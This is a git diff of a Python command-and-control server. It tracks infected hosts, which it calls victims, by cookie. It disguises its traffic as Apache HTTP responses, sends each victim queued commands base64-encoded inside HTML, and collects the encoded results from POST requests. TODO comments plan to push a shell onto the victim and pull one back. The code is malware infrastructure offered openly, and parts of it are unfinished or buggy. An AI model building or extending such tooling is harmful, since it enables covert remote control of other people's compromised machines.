@@ -21,19 +21,14 @@ master = {}
 
 
 # Tasks Needed to be done:
-#     Write code to list all available commands for clientCmdShell
 #     Find a way to format output in terminal
-#     Create a Cookie
 #     Write code to get data from client result and store it in a queue for later examination 
 #     Usage of UP and DOWN arrow keys to switch between history
 #     Find a way to use dictonaries rather than queues
 
-''' 
-## Write new slave init
-'''
 
 '''************************UPDATE THIS*****************************
-1: write function to delete bad cookies.
+1: Write showResults function and sort out addToQueue Threading
 2: find a way to send shell on the victim
 3: write a thread to get a shell from the victim.
 '''
@@ -55,7 +50,7 @@ class Slave():
         self.cmd_queue = queue.Queue()
         self.result_queue = queue.Queue()
         self.india_timezone = pytz.timezone('Asia/Kolkata')      # set timezone
-        self.time = datetime.now(india_timezone)
+        self.time = datetime.now(self.india_timezone)
         self.sendCookie()
         # self.cmd_parent_pipe,self.result_child_pipe, self.new_process = self.createConnectionProcess() 
 
@@ -82,46 +77,42 @@ class Slave():
                 self.cmd_queue.put(cmd)
 
 
-    def clientExecuter(self,client,cmd_child_pipe,result_parent_pipe):
-
-        self.pipe_thread = threading.Thread(target=self.addToQueue,args=())
-        self.pipe_thread.start()
-        while(True):
-            try:    
-                data = client.recv(4096)
-                data = data.decode('utf-8')
-                # data = data.encode('utf-8')
-                # sys.stdout.write("[DEBUG] data Recieved\n{}".format(data))
-                send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
+    def clientExecuter(self,data):
+        try:    
+            # sys.stdout.write("[DEBUG] data Recieved\n{}".format(data))
+            send_data = 'HTTP/1.0 200 OK\r\nServer: Apache/2.2.14 (Win32)\r\nContent-Type: text/html\r\n\r\n'
                 
-                if (self.cmd_queue.empty()):
-                    cmd = "helloworld"
-                else:
-                    cmd = self.cmd_queue.get()
-                cmd_byte = cmd.encode('utf-8')
+            if (self.cmd_queue.empty()):
+                cmd = "helloworld"
+            else:
+                cmd = self.cmd_queue.get()
+            cmd_byte = cmd.encode('utf-8')
 
-                if(re.findall('POST',data[:20])):
-                    send_data = send_data + 'POST request is recieved\r\n'
-                    # it means this is a result of some past request
-                elif(re.findall('GET',data[:20])):
-                    base = base64.b64encode(cmd_byte).decode('utf-8')
-                    send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
-                else:
-                    send_data = send_data + 'NO Request method found\r\n'
+            if(re.findall('POST',data[:20])):
+                base = base64.b64encode(cmd_byte).decode('utf-8')
+                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
+                data_pos_start = data.find('Data: ') + 6
+                data_pos_end = data.find(' :end')
+                result_encoded = data[data_pos_start : data_pos_end].decode('utf-8')
+                result = base64.b64decode(result_encoded)
+                self.result_queue.put(result)
+
+            elif(re.findall('GET',data[:20])):
+                base = base64.b64encode(cmd_byte).decode('utf-8')
+                send_data = send_data + '<html>\n<body>' + base + '</body>\n</html>\r\n'
+            else:
+                send_data = send_data + 'NO Request method found\r\n'
                 
-                send_data = send_data.encode('utf-8')
-                client.sendall(send_data)
+            send_data = send_data.encode('utf-8')
+            self.client.sendall(send_data)
 
-            except Exception:
-                current_proc_name = multiprocessing.current_process().name
-                sys.stdout.write("\nConnection broken from {}:{} in {}\n".format(self.hostname,str(self.port),current_proc_name))
-                self.removeNode()
-                break
-
-        self.pipe_thread.join()
+        except Exception:
+            sys.stdout.write("\nError While sending data to {}:{} with cookie {}\n".format(self.hostname,str(self.port),self.cookie))
+            self.removeNode()
+            
         self.client.shutdown(socket.SHUT_RDWR)
         self.client.close()
-        # Write code to get data from pipe and add commands to queue to execute and pipe back the data from the queue which stores result
+       
 
 
     def clientCmdShell(self):
@@ -137,6 +128,8 @@ class Slave():
                     break
                 elif(client_cmd =="lols"):                  # list all commands yet to send to current victim
                     self.cmd_parent_pipe.send("lols")
+                elif(client_cmd == "results"):
+                    self.showResults()
                 else:
                     self.cmd_parent_pipe.send(client_cmd)
         except Exception as ex:
@@ -160,10 +153,13 @@ class Slave():
         
     def removeNode(self):
         try:
-            slaves.pop(self.position)
+            slaves.pop(self.cookie)
         
         except Exception as ex:
             sys.stdout.write("\n[-] Unable to Remove Node. Reason: {}\n".format(ex))
+    
+    
+
             
 
 
@@ -251,17 +247,16 @@ def checkCookie(client):
     key_found = False
     if(cookie_pos != -1):
         cookie = data[cookie_pos+8:cookie_pos+40]
-        for key in slaves.keys:
+        for key in slaves.keys():
             if key == cookie:
-                slave = slaves[cookie]                          # Need to rewrite cookie find 
-                slave.checkData(data)
+                slave = slaves[cookie]                           
+                slave.clientExecuter(data)
                 key_found = True
                 break
         if(key_found == False):
             sys.stdout.write("[-] Bad Cookie detected\n")
-            sys.stdout.write("[+] Sending new Cookie\n")
-            # WRITE HERE**********************************************************************
-
+            sys.stdout.write("[+] Sending New Cookie\n")
+            createNewCookie(client)
     else:
         createNewCookie(client)
 
